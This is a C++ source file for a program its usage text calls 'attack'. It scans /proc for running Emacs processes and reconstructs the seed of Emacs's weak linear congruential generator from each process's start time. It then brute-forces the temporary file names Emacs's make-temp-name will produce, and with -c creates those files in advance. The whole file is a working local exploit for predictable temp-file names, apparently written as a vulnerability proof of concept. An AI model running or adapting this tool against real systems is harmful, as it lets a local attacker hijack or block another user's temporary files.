// Copyright 2017, Evan Klitzke <evan@eklitzke.org>
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

#include <cassert>
#include <cstdlib>
#include <cstring>

#include <fstream>
#include <iostream>
#include <locale>
#include <sstream>

#include <dirent.h>
#include <getopt.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>

#define USECS 1000000

// Table used by Emacs for generating a random suffix.
static const char make_temp_name_tbl[64] = {
    'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
    'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
    'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
    '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '-', '_'};

// The RNG used by Emacs, a simple LCG.
class LCG {
 public:
  LCG() = delete;
  LCG(const LCG &other) = delete;
  explicit LCG(int seed) : seed_(seed) {}

  inline void Next(char *out) {
    unsigned num = seed_;
    out[0] = make_temp_name_tbl[num & 63], num >>= 6;
    out[1] = make_temp_name_tbl[num & 63], num >>= 6;
    out[2] = make_temp_name_tbl[num & 63], num >>= 6;
    seed_ += 25229;
    seed_ %= 225307;
  }

 private:
  unsigned seed_;
};

// Take the difference of two timevals, x - y.
timeval TimeDiff(const timeval &x, const timeval &y) {
  timeval result{
      .tv_sec = x.tv_sec - y.tv_sec, .tv_usec = x.tv_usec - y.tv_usec,
  };
  if (result.tv_usec < 0) {
    result.tv_usec += USECS;
    result.tv_sec--;
    assert(result.tv_usec < USECS);
  }
  return result;
}

// Add two timevals, x + y.
timeval TimeAdd(const timeval &x, const timeval &y) {
  timeval result{
      .tv_sec = x.tv_sec + y.tv_sec, .tv_usec = x.tv_usec + y.tv_usec,
  };
  if (result.tv_usec >= USECS) {
    result.tv_usec -= USECS;
    result.tv_sec++;
    assert(result.tv_usec < USECS);
  }
  return result;
}

// Get the boot time for this system.
timeval BootTime() {
  timeval now;
  gettimeofday(&now, nullptr);

  std::string up;
  std::ifstream uptime_file("/proc/uptime");
  uptime_file >> up;

  // Get the seconds part of the uptime.
  timeval uptime{.tv_sec = strtol(up.c_str(), nullptr, 10)};

  // Get the microseconds part of the uptime. Is this really necessary? Probably
  // not, because we have to loop through a bunch of second offsets later on
  // anyway. But doing this is the Right Thing, so we persevere.
  size_t pos = up.find('.');
  if (pos != std::string::npos) {
    std::string up_usecs_str = up.substr(pos + 1);
    const size_t zeros_needed = 6 - up_usecs_str.length();
    std::ostringstream os;
    os << up_usecs_str;
    for (size_t i = 0; i < zeros_needed; i++) {
      os << "0";
    }
    uptime.tv_usec = strtol(os.str().c_str(), nullptr, 10);
  }

  // Finally convert seconds-since-boot into an actual absolute timeval.
  return TimeDiff(now, uptime);
}

// Return true if the string looks like a PID, false otherwise.
bool IsPid(const char *s) {
  while (*s) {
    if (!isdigit(*s++)) {
      return false;
    }
  }
  return true;
}

// Print usage.
void PrintUsage() {
  std::cout << "Usage: attack [-p|--prefix PREFIX] [-s|--seconds "
               "SECONDS] [-f|--files FILES] [-c|--create] [-q|--quiet]\n";
}

int main(int argc, char **argv) {
  bool found_emacs = false;
  bool create = false;
  bool verbose = true;
  std::string prefix;
  size_t seconds = 100;
  size_t files = 10;

  for (;;) {
    static option long_options[] = {
        {"create", no_argument, 0, 'c'},
        {"help", no_argument, 0, 'h'},
        {"prefix", required_argument, 0, 'p'},
        {"seconds", required_argument, 0, 's'},
        {"files", required_argument, 0, 'f'},
        {"quiet", no_argument, 0, 'q'},
    };
    int c = getopt_long(argc, argv, "chp:s:f:q", long_options, nullptr);
    if (c == -1) {
      break;
    }

    switch (c) {
      case 'c':
        create = true;
        break;
      case 'h':
        PrintUsage();
        return 0;
        break;
      case 'f':
        files = static_cast<size_t>(strtoul(optarg, nullptr, 10));
        break;
      case 'p':
        prefix = optarg;
        break;
      case 's':
        seconds = static_cast<size_t>(strtoul(optarg, nullptr, 10));
        break;
      case 'q':
        verbose = false;
        break;
      case '?':
        break;
      default:
        std::cerr << "Got unexpected flag: " << c << "\n";
        return 1;
        break;
    }
  }

  if (!create && !verbose) {
    std::cout << "Cowardly refusing to run with -q and without -c\n";
    PrintUsage();
    return 1;
  }

  DIR *proc = opendir("/proc");
  if (proc == nullptr) {
    std::cerr << "Failed to open /proc\n";
    return 1;
  }

  // Get the boot time for the system, in terms of number of seconds (and
  // microseconds!) since the epoch.
  const timeval boot_time = BootTime();

  // Number of jiffies in a second.
  const long jiffies = sysconf(_SC_CLK_TCK);

  // Create a null-terminated buffer for the LCG output.
  char buf[4];
  memset(buf, 0, sizeof(buf));

  for (;;) {
    dirent *d = readdir(proc);
    if (d == nullptr) {
      break;
    }
    if (!IsPid(d->d_name)) {
      continue;
    }

    std::ostringstream os;
    os << "/proc/" << d->d_name << "/stat";

    FILE *stat_file = fopen(os.str().c_str(), "r");
    if (stat_file == nullptr) {
      continue;
    }

    // Field #22 in /proc/PID/stat tells us when this process was started.
    //
    // This field is given to us in the least convenient possible format: number
    // of jiffies since the system was booted.
    char proc_name[128];
    int process_start;
    int matched =
        fscanf(stat_file,
               "%*d %s %*s %*d %*d %*d %*d %*d %*d %*d %*d %*d %*d %*d %*d %*d "
               "%*d %*d %*d %*d %*d %d",
               proc_name, &process_start);
    fclose(stat_file);

    // Is this process Emacs?. This can also be obtained via /proc/PID/comm or
    // /proc/PID/exe, but since we need to access /proc/PID/stat to get the time
    // the process was started, we might as well extract it here.
    if (matched != 2 || strcmp(proc_name, "(emacs)") != 0) {
      continue;
    }

    // This is bad, and I feel bad.
    float frac_sec = static_cast<float>(process_start % jiffies) /
                     static_cast<float>(jiffies);
    timeval up{.tv_sec = process_start / jiffies,
               .tv_usec = static_cast<int>(frac_sec * USECS)};

    // Finally get the Emacs start time as an absolute timeval.
    timeval emacs_start = TimeAdd(boot_time, up);

    // We know when the Emacs process was started. But we *don't* know when the
    // RNG was seeded. Thus we brute force things by looping through different
    // second offsets since the Emacs process was started. This number should be
    // fairly large, e.g. a user might generate their first temporary file 1000
    // seconds after Emacs was started.
    for (size_t i = 0; i < seconds; i++) {
      LCG lcg(emacs_start.tv_sec + i);

      // We also don't know how many times make-temp-name has been called. Since
      // each call updates the RNG state, we iterate through different values,
      // corresponding to different # calls to make-temp-name. This loop should
      // probably have a smaller upper bound than the previous loop, since under
      // normal operation temporary files are created somewhat infrequently.
      for (size_t j = 0; j < files; j++) {
        lcg.Next(buf);
        std::ostringstream os;
        os << prefix << d->d_name << buf;

        // Finally get a candidate file name!
        const std::string outname = os.str();

        if (create) {
          std::ofstream{outname};
        }
        if (verbose) {
          std::cout << outname << "\n";
        }
      }
    }
    found_emacs = true;
  }

  closedir(proc);

  if (!found_emacs) {
    std::cout << "No Emacs processes were found.\n";
  }

  return 0;
}
